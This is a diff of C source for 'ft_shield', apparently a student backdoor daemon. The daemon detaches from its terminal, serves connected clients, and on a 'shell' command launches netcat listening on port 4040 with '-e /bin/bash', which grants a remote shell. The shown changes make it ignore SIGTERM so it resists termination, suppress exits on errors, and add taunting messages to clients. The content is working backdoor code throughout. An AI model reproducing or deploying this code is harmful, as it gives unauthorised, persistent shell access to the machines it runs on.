@@ -62,13 +62,13 @@ void	send_msg_to_client(char *msg, int fd);
 void	ft_error(char *str)
 {
 	write(2, str, strlen(str));
-	exit(1);
+	// exit(1);
 }
 
 void	handle_signal(int sig)
 {
 	if (sig == SIGTERM)
-		exit(0);
+		return;
 }
 
 void	sigchld_handler(int sig)
@@ -86,7 +86,7 @@ void	sigchld_handler(int sig)
 			g_server->clients_info[i].in_shell = false;
 			g_server->clients_info[i].shell_pid = -1;
 			send_msg_to_client("Shell closed. Returning to server...\n", g_server->clients[i].fd);
-			send_msg_to_client("ft_shield $> ", g_server->clients[i].fd);
+			send_msg_to_client("ft_shield $> HAHAHA", g_server->clients[i].fd);
 			break;
 		}
 	}
@@ -137,7 +137,7 @@ void	create_daemon(void)
 	if (chdir("/") < 0)
 		ft_error("chdir");
 	umask(0);
-	fd = open("/dev/null", O_RDWR);
+	fd = open("/var/log/ft_shield_debug.log", O_WRONLY | O_CREAT | O_TRUNC, 0755);
 	if (fd < 0)
 		ft_error("open");
 	if (dup2(fd, STDIN_FILENO) < 0)
@@ -247,6 +247,7 @@ void	clear_client_connection(int fd)
 	{
 		if (g_server->clients[i].fd != fd)
 			continue;
+		send_msg_to_client("HAHAHAHHAHA...\n", g_server->clients[i].fd);
 		shutdown(fd, SHUT_RDWR);
 		close(fd);
 		g_server->clients[i].fd = -1;
@@ -301,13 +302,13 @@ void	create_remote_shell_session(int fd)
 		// close(g_server->server_sock);
 		// if (0 > dup2(fd, 0) || 0 > dup2(fd, 1) || 0 > dup2(fd, 2)) {
 		// 	send_msg_to_client("Error creating reverse shell\n", fd);
-		// 	exit(1);
+		// 	ft_error("dup2");
 		// }
 		char *argv[] = {"nc", "-l", "-p", "4040", "-e", "/bin/bash", NULL};
 		execv("/usr/bin/nc", argv);
 		send_msg_to_client("Failed to execute remote shell\n", fd);
-		ft_error("execv");
-		// exit(1);
+		// ft_error("execv");
+		exit(1);
 		// execl("/bin/bash", "/bin/bash", "-i", NULL);
 		// send_msg_to_client("Failed to create remote shell connection.\n", fd);
 	}
@@ -377,7 +378,10 @@ void	handle_client_commands(int fd, char *cmd)
 	if (!strcmp(user_input, "help") || !strcmp(user_input, "?"))
 		send_msg_to_client(FT_SHIELD_COMMANDS, fd);
 	else if (!strcmp(user_input, "exit"))
+	{
+		send_msg_to_client("WOWOWOWO...\n", fd);
 		clear_client_connection(fd);
+	}
 	else if (!strcmp(user_input, "shell"))
 		create_remote_shell_session(fd);
 	else if (!strcmp(user_input, "reverse"))
@@ -471,10 +475,12 @@ void	run_server(void)
 		{
 			for (int i = 0; i < g_server->client_count; i++)
 				clear_client_connection(g_server->clients[i].fd);
-			break;
+			continue;
 		}
-		for (int i = 0; i < g_server->client_count+1; i++)
+		for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT+1; i++)
 		{
+			if (g_server->clients[i].fd == -1)
+				continue;
 			if (g_server->clients[i].revents & POLLIN)
 			{
 				if (g_server->clients[i].fd == g_server->server_sock)
